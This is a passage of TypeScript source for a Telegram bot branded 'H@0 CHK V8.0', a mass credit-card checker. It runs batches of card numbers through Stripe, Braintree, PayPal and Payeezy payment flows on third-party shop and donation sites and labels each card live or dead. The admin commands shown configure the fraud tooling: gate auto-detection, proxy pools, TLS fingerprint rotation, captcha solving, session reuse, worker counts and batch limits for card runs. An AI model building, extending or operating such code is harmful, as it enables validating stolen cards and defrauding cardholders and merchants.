        if (thinking) await bot?.editMessageText(err, { chat_id: chatId, message_id: thinking.message_id }).catch(() => bot?.sendMessage(chatId, err));
        else bot?.sendMessage(chatId, err);
      }
    });

    // ── /version — show build, feature inventory, and runtime status ────────────
    bot.onText(/\/version$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      const isAdmin = await checkAdmin(telegramId, botUser);
      const uptime = process.uptime();
      const days = Math.floor(uptime / 86400);
      const hours = Math.floor((uptime % 86400) / 3600);
      const mins = Math.floor((uptime % 3600) / 60);
      const mem = process.memoryUsage();
      const heapMB = Math.round(mem.heapUsed / 1024 / 1024);
      bot?.sendMessage(chatId,
`🔰 *H@0 CHK V8.0*
━━━━━━━━━━━━━━━━━━━━
*Gates:* Stripe (PI/Auth/Charge/Charitable/GiveWP/GravityForms/Page-Confirm/Checkout-Session) · Braintree (WC/Spree/BC) · PayPal (Commerce/PPCP/Vault) · Payeezy (WC + First-Data)
*Robustness:* TLS fingerprint rotation · BIN cache + antipublic.cc · site cooldown + session reuse · 2captcha/anticaptcha auto-solve · GiveWP nonce auto-retry · per-gate proxy/captcha/cookies overrides · response classifier overrides
${isAdmin ? `*AI:* ${readAIKey() ? "✓ configured" : "✗ run /setaikey"}\n*Uptime:* ${days}d ${hours}h ${mins}m\n*Heap:* ${heapMB} MB` : ""}`,
        { parse_mode: "Markdown" });
    });

    // ── /setaikey — admin-only persistence of the NVIDIA API key for /ai ────────
    bot.onText(/\/setaikey(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only.");
        return;
      }
      const arg = (match?.[1] || "").trim();
      // /setaikey         → show masked current key + usage
      // /setaikey clear   → delete the stored key
      // /setaikey <key>   → save key to file (and try to delete the user message
      //                     for privacy when running in a non-private chat)
      if (!arg) {
        const current = readAIKey();
        const { aiKeySource } = await import("./ai-key");
        const src = aiKeySource();
        const source = src === "env" ? "env var (NVIDIA_API_KEY)" : src === "file" ? "file" : "(none)";
        bot?.sendMessage(chatId,
`🔑 *AI API Key*
━━━━━━━━━━━━━━━━━━━━
Current: \`${maskAIKey(current)}\`
Source: ${source}

\`/setaikey <key>\` — save a new key
\`/setaikey clear\` — remove the saved key`,
          { parse_mode: "Markdown" });
        return;
      }
      if (arg.toLowerCase() === "clear" || arg.toLowerCase() === "remove") {
        try { clearAIKey(); } catch (e: any) {
          bot?.sendMessage(chatId, `❌ Couldn't clear: ${e.message}`);
          return;
        }
        bot?.sendMessage(chatId, "🧹 Saved key removed. (Env var, if set, still applies.)");
        return;
      }
      try {
        writeAIKey(arg);
        // Try to delete the original message so the key doesn't sit in chat history
        try { await bot?.deleteMessage(chatId, msg.message_id); } catch { /* not always permitted */ }
        bot?.sendMessage(chatId, `✅ Key saved: \`${maskAIKey(arg)}\`\n${msg.chat.type !== "private" ? "⚠️ Tip: send `/setaikey` in DM next time so the raw key never hits a group chat." : ""}`, { parse_mode: "Markdown" });
      } catch (e: any) {
        bot?.sendMessage(chatId, `❌ Save failed: ${e.message}`);
      }
    });

    // ── /aiconfig — single-gate AI configurator ─────────────────────────────────
    //   Flow: pick gate → bot re-detects URL → scrapes page hints → asks
    //   NVIDIA Llama-70B for an optimal advanced config → shows preview →
    //   admin taps ✅ Apply or ✖️ Cancel.
    bot.onText(/\/aiconfig(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      if (!isFeatureEnabled("ai_config")) { bot?.sendMessage(chatId, "🚫 /aiconfig is disabled."); return; }
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only. Use /login");
        return;
      }
      const apiKey = readAIKey();
      if (!apiKey) {
        bot?.sendMessage(chatId, "⚠️ Set the AI key first with `/setaikey <key>`.", { parse_mode: "Markdown" });
        return;
      }
      const filter = (match?.[1] || "").trim().toLowerCase();
      const allGates = await storage.getGateConfigs();
      if (allGates.length === 0) { bot?.sendMessage(chatId, "⚠️ No gates configured."); return; }
      const gates = filter
        ? allGates.filter(g => g.name.toLowerCase().includes(filter) || g.id.startsWith(filter))
        : allGates;
      if (gates.length === 0) { bot?.sendMessage(chatId, `⚠️ No gate matches "${filter}".`); return; }

      if (gates.length > 1) {
        const keyboard = gates.slice(0, 20).map(g => [{
          text: `${g.active ? "🟢" : "🔴"} ${g.name} (${g.gateType})`,
          callback_data: `aic_pick_${g.id.slice(0, 8)}`,
        }]);
        bot?.sendMessage(chatId,
`🤖 *AI Gate Configurator*
━━━━━━━━━━━━━━━━━━━━
Pick a gate to analyze.\n${gates.length > 20 ? `_(showing first 20 of ${gates.length} — use \`/aiconfig <name>\` to filter)_` : ""}`,
          { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } });
        return;
      }
      await runAiConfigure(chatId, telegramId, gates[0].id, apiKey);
    });

    // ── /ai — admin-only AI chat (multi-turn conversation per admin) ────────────
    // Anchored — without ^\/ai\b this regex matched /aiconfig and /setaikey
    // too because /ai is a substring of both, causing dual-fire on every
    // /aiconfig or /setaikey command.
    bot.onText(/^\/ai(?:@\w+)?(?:\s+([\s\S]+))?$/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      if (!isFeatureEnabled("ai_chat")) { bot?.sendMessage(chatId, "🚫 /ai is disabled."); return; }
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 *AI chat is admin-only.* Use /login first.", { parse_mode: "Markdown" });
        return;
      }

      const prompt = (match?.[1] || "").trim();
      if (!prompt) {
        bot?.sendMessage(chatId,
`🤖 *AI Chat — usage*
━━━━━━━━━━━━━━━━━━━━
\`/ai your question here\`
\`/ai reset\` — clear conversation history

Multi-turn: the bot remembers your last ~10 turns. Powered by NVIDIA Llama-3.1-70B (set \`NVIDIA_API_KEY\` env var).`,
          { parse_mode: "Markdown" });
        return;
      }

      if (prompt.toLowerCase() === "reset" || prompt.toLowerCase() === "clear") {
        aiHistory.delete(telegramId);
        bot?.sendMessage(chatId, "🧹 Conversation cleared.");
        return;
      }

      const apiKey = readAIKey();
      if (!apiKey) {
        bot?.sendMessage(chatId,
          "⚠️ *AI not configured.* Set a key with `/setaikey <your-nvidia-key>` or export `NVIDIA_API_KEY` on the server.",
          { parse_mode: "Markdown" });
        return;
      }

      const history = aiHistory.get(telegramId) || [];
      history.push({ role: "user", content: prompt });
      // Cap at last 10 user/assistant pairs (= 20 messages) to keep payload reasonable.
      const trimmed = history.slice(-20);

      const thinking = await bot?.sendMessage(chatId, "🤔 _thinking…_", { parse_mode: "Markdown" });

      try {
        const resp = await fetch("https://integrate.api.nvidia.com/v1/chat/completions", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${apiKey}`,
          },
          body: JSON.stringify({
            model: "meta/llama-3.1-70b-instruct",
            messages: [
              { role: "system", content: "You are a concise, technical assistant for the H@0 CHK V8 admin running a Telegram bot. Reply in Markdown, keep replies short unless the user explicitly asks for detail." },
              ...trimmed,
            ],
            temperature: 0.5,
            max_tokens: 1024,
          }),
          signal: AbortSignal.timeout(60_000),
        });

        if (!resp.ok) {
          const errText = (await resp.text()).slice(0, 200);
          throw new Error(`API ${resp.status}: ${errText}`);
        }

        const data: any = await resp.json();
        const reply = data.choices?.[0]?.message?.content?.trim() || "(empty response)";

        history.push({ role: "assistant", content: reply });
        aiHistory.set(telegramId, history.slice(-20));

        // Telegram message cap is 4096 — chunk if necessary
        const chunks: string[] = [];
        let remaining = reply;
        while (remaining.length > 3800) {
          chunks.push(remaining.slice(0, 3800));
          remaining = remaining.slice(3800);
        }
        chunks.push(remaining);

        try {
          if (thinking) await bot?.editMessageText(chunks[0], { chat_id: chatId, message_id: thinking.message_id, parse_mode: "Markdown" });
        } catch {
          // Markdown parse failure → resend as plain text
          if (thinking) await bot?.editMessageText(chunks[0], { chat_id: chatId, message_id: thinking.message_id });
        }
        for (const extra of chunks.slice(1)) {
          await bot?.sendMessage(chatId, extra);
        }
      } catch (e: any) {
        const errMsg = `❌ AI error: ${e.message || String(e)}`.slice(0, 400);
        try {
          if (thinking) await bot?.editMessageText(errMsg, { chat_id: chatId, message_id: thinking.message_id });
          else await bot?.sendMessage(chatId, errMsg);
        } catch { await bot?.sendMessage(chatId, errMsg); }
      }
    });

    bot.onText(/\/reset$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";

      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }

      const keyboard = [
        [{ text: "🗑️ All Data (Full Reset)", callback_data: "reset_all" }],
        [{ text: "📊 Check Results", callback_data: "reset_checks" }],
        [{ text: "👥 Bot Users", callback_data: "reset_users" }],
        [{ text: "🔧 Gate Configs", callback_data: "reset_gates" }],
        [{ text: "🔑 Access Keys", callback_data: "reset_keys" }],
        [{ text: "🌐 Proxies", callback_data: "reset_proxies" }],
        [{ text: "📝 System Logs", callback_data: "reset_logs" }],
      ];

      bot?.sendMessage(chatId,
`⚠️ *System Reset*
━━━━━━━━━━━━━━━━━━━━
Select what to reset:`, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard },
      });
    });

    // ── /addgate — interactive gate setup (auto-detect / mass / manual) ─────────
    const showAddGateMenu = async (chatId: number, telegramId: string, msgId?: number) => {
      const text = `🚀 *Add New Gate*\n━━━━━━━━━━━━━━━━━━━━\nChoose how to add a gate:`;
      const keyboard = [
        [{ text: "🔍 Auto-Detect URL", callback_data: "gs_auto" }, { text: "📋 Mass Setup", callback_data: "gs_mass" }],
        [{ text: "✏️ Manual Step-by-Step", callback_data: "gs_manual" }],
      ];
      gateSetupCtx.delete(telegramId);
      if (msgId) {
        bot?.editMessageText(text, { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } }).catch(() =>
          bot?.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } })
        );
      } else {
        bot?.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } });
      }
    };

    // /addgate with no args — show mode selection menu
    bot.onText(/^\/addgate$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }
      await showAddGateMenu(chatId, telegramId);
    });

    // /addgate <url> — fast auto-detect shortcut
    bot.onText(/^\/addgate (.+)/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }
      const arg = (match?.[1] || "").trim();
      // URL shortcut — start auto-detect immediately
      if (arg.startsWith("http://") || arg.startsWith("https://")) {
        const ctx: GateSetupCtx = { mode: "auto", step: "detecting", chatId, url: arg };
        gateSetupCtx.set(telegramId, ctx);
        const statusMsg = await bot!.sendMessage(chatId, `🔍 Detecting \`${arg.slice(0, 60)}\`…`, { parse_mode: "Markdown" });
        try {
          const detection = await detectGateFromUrl(arg);
          ctx.detection = detection;
          if (detection.gateType === "unknown") {
            bot?.editMessageText(`❌ No payment gateway detected on \`${arg.slice(0, 50)}\`\nTry Manual setup instead.`, {
              chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "Markdown",
              reply_markup: { inline_keyboard: [[{ text: "✏️ Manual Setup", callback_data: "gs_manual" }, { text: "✖️ Cancel", callback_data: "gs_cancel" }]] },
            }).catch(() => {});
            gateSetupCtx.delete(telegramId);   // free the slot — see fix in await_url branch
          } else {
            ctx.name = autoGateName(detection.gateType, detection.siteUrl || arg);
            const sigs = (detection.signals || []).slice(0, 4).join(", ");
            const preview = `🔍 *Detected:* \`${detection.gateType?.toUpperCase()}\` · ${detection.subType}\n*URL:* \`${arg.slice(0, 50)}\`\n*Confidence:* ${detection.confidence}%\n*Signals:* ${sigs || "none"}\n*Name:* \`${ctx.name}\``;
            ctx.step = "confirm_auto";
            // Parity with menu auto-flow: offer Save & Configure here too.
            bot?.editMessageText(`✅ *Gate Detected*\n━━━━━━━━━━━━━━━━━━━━\n${preview}`, {
              chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "Markdown",
              reply_markup: { inline_keyboard: [
                [{ text: "✅ Save Gate", callback_data: "gs_save_auto" }, { text: "⚙️ Save & Configure", callback_data: "gs_save_auto_edit" }],
                [{ text: "✖️ Cancel", callback_data: "gs_cancel" }],
              ]},
            }).catch(() => {});
          }
        } catch (e: any) {
          bot?.editMessageText(`❌ Detection error: ${e.message?.slice(0, 80)}`, { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "Markdown" }).catch(() => {});
          gateSetupCtx.delete(telegramId);
        }
        return;
      }
      // Legacy pipe format fallback: type|name|url
      const parts = arg.split("|").map(p => p.trim());
      if (parts.length >= 3) {
        const [gateType, name, url] = parts;
        await storage.createGateConfig({ name, gateType: gateType.toLowerCase(), subType: "payment_intents", url, active: true, settings: {} });
        await storage.createSystemLog({ level: "SUCCESS", message: `Gate "${name}" (${gateType}) added via Telegram`, source: "telegram" });
        bot?.sendMessage(chatId, `✅ Gate *${name}* added (${gateType.toUpperCase()})`, { parse_mode: "Markdown" });
        return;
      }
      // Otherwise show menu
      await showAddGateMenu(chatId, telegramId);
    });

    // ── /setmasslimit — owner-only batch size for /mass + .txt uploads ────────
    //   /setmasslimit             → show current limits
    //   /setmasslimit admin 1000  → bump admin batch to 1000
    //   /setmasslimit user 100    → bump user batch to 100
    //   /setmasslimit reset       → back to defaults (500 / 50)
    bot.onText(/\/setmasslimit(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkOwner(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Owner only.");
        return;
      }
      const args = (match?.[1] || "").trim().split(/\s+/);
      if (!args[0] || args[0] === "show") {
        const lim = getMassLimits();
        bot?.sendMessage(chatId,
`📊 *Mass-Check Batch Limits*
━━━━━━━━━━━━━━━━━━━━
👑 *Admin:* ${lim.adminMax} cards/run
👤 *User:* ${lim.userMax} cards/run
Hard cap: ${MASS_LIMIT_HARD_CAP}

\`/setmasslimit admin <N>\` — set admin batch
\`/setmasslimit user <N>\` — set user batch
\`/setmasslimit reset\` — back to ${500}/${50}`,
          { parse_mode: "Markdown" });
        return;
      }
      if (args[0] === "reset") {
        resetMassLimits();
        bot?.sendMessage(chatId, "✅ Mass-check limits reset to 500 / 50.");
        return;
      }
      const tier = args[0] === "admin" ? "admin" : args[0] === "user" ? "user" : null;
      const value = parseInt(args[1], 10);
      if (!tier || !Number.isFinite(value)) {
        bot?.sendMessage(chatId, "Usage: `/setmasslimit admin|user <number>` or `/setmasslimit reset`", { parse_mode: "Markdown" });
        return;
      }
      const result = setMassLimit(tier, value);
      if ("error" in result) {
        bot?.sendMessage(chatId, `❌ ${result.error}`);
        return;
      }
      bot?.sendMessage(chatId,
`✅ ${tier === "admin" ? "Admin" : "User"} mass-check limit → *${tier === "admin" ? result.adminMax : result.userMax}*`,
        { parse_mode: "Markdown" });
    });

    // ── /massworkers [N] — get/set parallel worker count (admin) ────────────
    //   /massworkers      → show current setting
    //   /massworkers 4    → set to 4 parallel workers (1–8)
    bot.onText(/^\/massworkers(?:@\w+)?(?:\s+(\d+))?\s*$/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) { bot?.sendMessage(chatId, "🔒 Admin only."); return; }
      const cfg = await storage.getBotSettings();
      const current = cfg.massWorkers ?? 1;
      const arg = match?.[1];
      if (!arg) {
        bot?.sendMessage(chatId,
`⚡ *Mass Check Workers*
━━━━━━━━━━━━━━━━━━━━
Current: *${current}* worker${current !== 1 ? "s" : ""}
Range: 1–8 (1 = sequential, 8 = max parallel)

\`/massworkers <N>\` — change worker count`, { parse_mode: "Markdown" });
        return;
      }
      const n = Math.min(Math.max(parseInt(arg, 10), 1), 8);
      await storage.updateBotSettings({ massWorkers: n });
      bot?.sendMessage(chatId,
        `✅ Mass check workers → *${n}*${n === 1 ? " (sequential mode)" : ` (${n}× parallel)`}`,
        { parse_mode: "Markdown" });
    });

    // ── /massdedup [on|off|clear|status] — velocity/dedup guard (admin) ──────
    //   /massdedup          → show current state + stats
    //   /massdedup on|off   → toggle dedup guard
    //   /massdedup 30       → set velocity window to 30 minutes
    //   /massdedup clear    → wipe the in-memory guard
    bot.onText(/^\/massdedup(?:@\w+)?(?:\s+(.+))?\s*$/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) { bot?.sendMessage(chatId, "🔒 Admin only."); return; }
      const cfg = await storage.getBotSettings();
      const arg = (match?.[1] || "").trim().toLowerCase();

      if (!arg || arg === "status") {
        const on = cfg.massDedup ?? true;
        const mins = cfg.massVelocityMins ?? 15;
        bot?.sendMessage(chatId,
`🛡 *Velocity / Dedup Guard*
━━━━━━━━━━━━━━━━━━━━
Status: *${on ? "ON ✅" : "OFF ❌"}*
Window: *${mins}m* (cards re-checked after this)
Tracked PANs: *${velocityGuardSize()}*

\`/massdedup on|off\` — toggle
\`/massdedup <N>\` — set window to N minutes
\`/massdedup clear\` — wipe tracked PAN list`, { parse_mode: "Markdown" });
        return;
      }
      if (arg === "on" || arg === "off") {
        await storage.updateBotSettings({ massDedup: arg === "on" });
        bot?.sendMessage(chatId, `✅ Dedup guard *${arg === "on" ? "enabled" : "disabled"}*.`, { parse_mode: "Markdown" });
        return;
      }
      if (arg === "clear") {
        clearVelocityGuard();
        bot?.sendMessage(chatId, "✅ Velocity guard cleared — all PANs will be re-checkable.");
        return;
      }
      const mins = parseInt(arg, 10);
      if (Number.isFinite(mins) && mins >= 1 && mins <= 1440) {
        await storage.updateBotSettings({ massVelocityMins: mins });
        bot?.sendMessage(chatId, `✅ Velocity window → *${mins}m*`, { parse_mode: "Markdown" });
        return;
      }
      bot?.sendMessage(chatId, "Usage: `/massdedup on|off|clear|<minutes>`", { parse_mode: "Markdown" });
    });

    // ─── /proxies — list proxy stats + first 10 entries (admin) ─────────────
    bot.onText(/^\/proxies(?:@\w+)?\s*$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      try {
        const stats = await storage.getProxyStats();
        const all = await storage.getProxies();
        const live = all.filter(p => p.status === "live").slice(0, 10);
        let text = `🌐 *Proxy Pool*\n━━━━━━━━━━━━━━━━━━━━\n`;
        text += `Total: *${stats.total}* · Live: *${stats.live}* · Avg latency: *${stats.avgLatency}ms*\n\n`;
        if (live.length === 0) {
          text += `_No live proxies. Add some via /addproxy._`;
        } else {
          text += `*First ${live.length} live:*\n`;
          for (const p of live) {
            const auth = p.username ? "🔐" : "🔓";
            const lat = p.latency != null ? `${p.latency}ms` : "?";
            text += `${auth} \`${p.protocol}://${p.ip}:${p.port}\` ${lat} ${p.country || ""}\n`;
          }
        }
        bot?.sendMessage(chatId, text, { parse_mode: "Markdown" });
      } catch (e: any) {
        bot?.sendMessage(chatId, `❌ Failed: ${e?.message?.slice(0, 120) || "unknown error"}`);
      }
    });

    // ─── /addproxy URL  or  /addproxy bulk → admin sends list (admin) ────────
    // Single: /addproxy http://user:pass@host:port  (or  ip:port, ip:port:user:pass)
    // Bulk:   /addproxy bulk  → bot prompts for list, next msg is the URLs
    bot.onText(/^\/addproxy(?:@\w+)?(?:\s+([\s\S]+))?$/s, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      const arg = (match?.[1] || "").trim();

      // Same parsing the HTTP route uses (routes.ts ~1694) — duplicated here
      // to keep the bot module self-contained; later can be extracted to a
      // shared helper if a third caller appears.
      const parseLine = (line: string) => {
        line = line.trim().replace(/^\[.*?\]\s*/, "");
        if (!line || line.startsWith("#") || line.startsWith("//")) return null;
        let protocol = "http";
        let workLine = line;
        const protoMatch = line.match(/^(https?|socks[45]):\/\//i);
        if (protoMatch) { protocol = protoMatch[1].toLowerCase(); workLine = line.slice(protoMatch[0].length); }
        const atIdx = workLine.indexOf("@");
        if (atIdx !== -1) {
          const auth = workLine.slice(0, atIdx);
          const hostPart = workLine.slice(atIdx + 1);
          const colonIdx = auth.indexOf(":");
          const username = colonIdx !== -1 ? auth.slice(0, colonIdx) : auth;
          const password = colonIdx !== -1 ? auth.slice(colonIdx + 1) : undefined;
          const hostPortMatch = hostPart.match(/^([^:]+):(\d+)$/);
          if (hostPortMatch) {
            const port = parseInt(hostPortMatch[2], 10);
            if (port > 0 && port <= 65535) return { ip: hostPortMatch[1], port, protocol, username: username || undefined, password };
          }
          return null;
        }
        const parts = workLine.split(":");
        if (parts.length >= 2) {
          const ip = parts[0].trim();
          const port = parseInt(parts[1].trim(), 10);
          if (!ip || isNaN(port) || port < 1 || port > 65535) return null;
          return { ip, port, protocol, username: parts[2]?.trim() || undefined, password: parts[3]?.trim() || undefined };
        }
        return null;
      };

      if (!arg) {
        bot?.sendMessage(chatId,
`📡 *Add Proxy*
\`/addproxy <URL>\` — single proxy
Accepted formats:
  • \`http://user:pass@host:port\`
  • \`socks5://host:port\`
  • \`ip:port\` or \`ip:port:user:pass\`

For bulk: send the list as a *multi-line message* with one proxy per line, captioned with \`/addproxy\`.`,
          { parse_mode: "Markdown" });
        return;
      }

      const lines = arg.split(/\r?\n/).map(l => l.trim()).filter(Boolean);
      const parsed = lines.map(parseLine).filter(Boolean) as Array<{ ip: string; port: number; protocol: string; username?: string; password?: string }>;
      const skipped = lines.length - parsed.length;

      if (parsed.length === 0) {
        bot?.sendMessage(chatId, `❌ No valid proxy lines found (got ${lines.length} lines).`);
        return;
      }

      try {
        await storage.bulkCreateProxies(parsed as any);
        bot?.sendMessage(chatId, `✅ Imported *${parsed.length}* proxies${skipped ? `, skipped ${skipped} malformed lines` : ""}.\nTotal pool — see /proxies`, { parse_mode: "Markdown" });
        await storage.createSystemLog({ level: "INFO", message: `Imported ${parsed.length} proxies via Telegram /addproxy`, source: "telegram" });
      } catch (e: any) {
        bot?.sendMessage(chatId, `❌ Save failed: ${e?.message?.slice(0, 120) || "unknown error"}`);
      }
    });

    // ─── /proxy_clear — drop all proxies marked dead (admin) ─────────────────
    bot.onText(/^\/proxy_clear(?:@\w+)?\s*$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      const n = await storage.clearDeadProxies();
      bot?.sendMessage(chatId, `🧹 Cleared *${n}* dead proxies.`, { parse_mode: "Markdown" });
    });

    // ─── /logs [n] — last N system log lines (admin) ─────────────────────────
    bot.onText(/^\/logs(?:@\w+)?(?:\s+(\d+))?\s*$/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      const n = Math.min(Math.max(parseInt(match?.[1] || "10", 10), 1), 50);
      const logs = await storage.getSystemLogs(n);
      if (logs.length === 0) { bot?.sendMessage(chatId, "_No system logs yet._", { parse_mode: "Markdown" }); return; }
      const icon = (lvl: string) =>
        lvl === "ERROR"   ? "🛑" :
        lvl === "WARN"    ? "⚠️" :
        lvl === "SUCCESS" ? "✅" :
        lvl === "INFO"    ? "ℹ️" : "•";
      let text = `📜 *Last ${logs.length} system logs*\n━━━━━━━━━━━━━━━━━━━━\n`;
      for (const l of logs) {
        const when = new Date(l.createdAt as any).toISOString().slice(11, 19);
        const sourceTag = l.source ? ` \`[${l.source}]\`` : "";
        text += `${icon(l.level)} \`${when}\`${sourceTag} ${l.message.slice(0, 110)}\n`;
      }
      // Telegram caps at 4096 chars per message; chunk if needed
      if (text.length > 3900) text = text.slice(0, 3900) + "\n…(truncated)";
      bot?.sendMessage(chatId, text, { parse_mode: "Markdown" });
    });

    // ─── /clearsessions — drop the in-memory gate session cache (admin) ──────
    bot.onText(/^\/clearsessions(?:@\w+)?\s*$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      const cached = listCachedSessions();
      const cleared = clearAllSessions();
      bot?.sendMessage(chatId,
`🧹 *Session cache cleared.*
Removed *${cleared}* cached gate sessions${cached.length !== cleared ? ` (snapshot showed ${cached.length})` : ""}.
Next card check on each site re-scrapes nonces fresh.`,
        { parse_mode: "Markdown" });
    });

    // ─── /classmode [strict|lenient] — classifier strictness (admin) ─────────
    bot.onText(/^\/classmode(?:@\w+)?(?:\s+(strict|lenient|on|off|true|false))?\s*$/i, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      const arg = match?.[1]?.toLowerCase();
      if (!arg) {
        const cur = getClassifierState();
        bot?.sendMessage(chatId,
`🎯 *Classifier Mode*
Current: *${cur.strictDeclineMode ? "strict" : "lenient"}*

Strict: any decline_code from a known list → DEAD even with token signals
Lenient: normal classifier rules (token-only can still be LIVE)

Toggle with \`/classmode strict\` or \`/classmode lenient\`.`,
          { parse_mode: "Markdown" });
        return;
      }
      const on = arg === "strict" || arg === "on" || arg === "true";
      const next = setStrictDeclineMode(on);
      await storage.createSystemLog({ level: "INFO", message: `Classifier strict-decline mode ${on ? "ENABLED" : "DISABLED"} via Telegram`, source: "telegram" });
      bot?.sendMessage(chatId, `✅ Classifier set to *${next.strictDeclineMode ? "strict" : "lenient"}*.`, { parse_mode: "Markdown" });
    });

    // ─── /exportgates — send all gate configs as a JSON attachment (admin) ───
    bot.onText(/^\/exportgates(?:@\w+)?\s*$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      try {
        const gates = await storage.getGateConfigs();
        // Strip internal columns (id, createdAt) — keep the user-meaningful
        // fields so the file is portable across instances on import.
        const portable = gates.map(g => ({
          name: g.name, gateType: g.gateType, subType: g.subType,
          url: g.url, active: g.active, settings: g.settings,
        }));
        const json = JSON.stringify(portable, null, 2);
        const buf = Buffer.from(json, "utf-8");
        const ts = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
        await bot?.sendDocument(chatId, buf, {
          caption: `📦 *Gate Export* — ${gates.length} gates\n\nSend this file back with caption \`/importgates\` to restore on another instance.`,
          parse_mode: "Markdown",
        }, { filename: `gates_${ts}.json`, contentType: "application/json" });
      } catch (e: any) {
        bot?.sendMessage(chatId, `❌ Export failed: ${e?.message?.slice(0, 120) || "unknown error"}`);
      }
    });

    // ─── /deletegate NAME_OR_PREFIX — remove a gate by name or short id (admin)
    // ─── /importgates — explains the upload-with-caption workflow ────────────
    // Users naturally type /importgates expecting a prompt; show them how.
    bot.onText(/^\/importgates(?:@\w+)?\s*$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      bot?.sendMessage(chatId,
`📥 *Import Gates from JSON*

Send (or forward) a \`.json\` file to this chat with the caption \`/importgates\`.

*Expected shape* — an array of gates, or \`{ gates: [...] }\`:
\`\`\`
[
  {
    "name": "STRIPE-SHOP",
    "gateType": "stripe",
    "subType": "payment_intents",
    "url": "https://shop.example.com",
    "active": true,
    "settings": { "publicKey": "pk_live_…" }
  }
]
\`\`\`

Use /exportgates to grab a portable file from this instance first if you want to sync.`,
        { parse_mode: "Markdown" });
    });

    bot.onText(/^\/deletegate(?:@\w+)?(?:\s+(.+))?\s*$/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      const target = (match?.[1] || "").trim();
      if (!target) {
        bot?.sendMessage(chatId, "❌ Usage: `/deletegate <name or id-prefix>`", { parse_mode: "Markdown" });
        return;
      }
      const gates = await storage.getGateConfigs();
